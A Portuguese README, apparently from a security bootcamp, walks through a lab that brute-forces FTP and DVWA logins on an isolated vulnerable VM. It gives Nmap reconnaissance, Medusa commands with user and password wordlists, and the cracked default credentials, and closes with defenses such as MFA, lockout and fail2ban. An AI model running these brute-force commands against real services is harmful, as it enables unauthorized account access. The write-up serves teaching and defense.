🔐 Ataque de Força Bruta com Medusa e Kali Linux

Laboratório de segurança ofensiva: uso do Medusa para realizar ataques de força bruta de autenticação contra os serviços HTTP (DVWA) e FTP (vsFTPd) de uma máquina alvo vulnerável, em ambiente isolado e controlado.

⚠️ Aviso legal: todo o conteúdo deste repositório foi executado em um laboratório próprio e isolado, montado apenas para fins educacionais. Ataques de força bruta contra sistemas sem autorização expressa do dono são crime (no Brasil, art. 154-A do Código Penal). Use estas técnicas somente em ambientes que você controla ou para os quais tem autorização por escrito.

🎯 Objetivo

Demonstrar, na prática, como senhas fracas e serviços mal configurados permitem acesso não autorizado, e como a ferramenta Medusa automatiza a descoberta dessas credenciais a partir de listas de usuários e senhas.

🧰 Ambiente do laboratório
Componente	Descrição
Atacante	Kali Linux
Alvo	Máquina vulnerável (DVWA / Metasploitable) — 192.168.56.101
Rede	Rede isolada host-only 192.168.56.0/24 (VirtualBox), sem acesso à internet
Ferramentas	Medusa, Nmap, cliente FTP, navegador
Serviços testados	HTTP (DVWA, porta 80) e FTP (vsFTPd, porta 21)
🪜 Etapas
1. Reconhecimento com Nmap

Identificação dos serviços e portas abertas no alvo antes do ataque.

bash
nmap -sV 192.168.56.101
2. Preparação das wordlists

Listas de usuários e senhas usadas pelo Medusa.

bash
# users.txt
admin
root
msfadmin
user

# passwords.txt
password
123456
qwerty
msfadmin
3. Força bruta no FTP
bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp

Resultado: credencial msfadmin : msfadmin encontrada e validada com login real no serviço FTP.

bash
ftp 192.168.56.101
# 230 Login successful.
4. Força bruta no HTTP (DVWA)

Ataque ao formulário de login da aplicação web.

bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M http -m DIR:/dvwa/login.php

Resultado: combinações válidas de usuário e senha identificadas para o login da aplicação.

📸 Evidências

As capturas de tela do processo estão na pasta /images.

Arquivo	Conteúdo
nmap.png	Reconhecimento das portas e serviços
medusa-ftp.png	Força bruta e login bem-sucedido no FTP
medusa-http.png	Força bruta no login da DVWA
📚 O que este laboratório demonstra
Senhas fracas (como msfadmin, 123456) são quebradas em segundos por ataque automatizado.
Serviços legados sem proteção contra tentativas repetidas (rate limiting, bloqueio de conta) são alvos fáceis.
A importância de contramedidas: senhas fortes, MFA, bloqueio após N tentativas, e ferramentas como fail2ban.
🛡️ Como se proteger
Impor senhas fortes e proibir as mais comuns.
Bloquear a conta ou aplicar atraso após várias tentativas falhas.
Usar autenticação multifator (MFA).
Monitorar logs de autenticação e usar fail2ban ou similar.
Desativar serviços desnecessários e manter tudo atualizado.

👤 Caetano Nascimento · Bootcamp de Cibersegurança (Santander / DIO) GitHub · LinkedIn
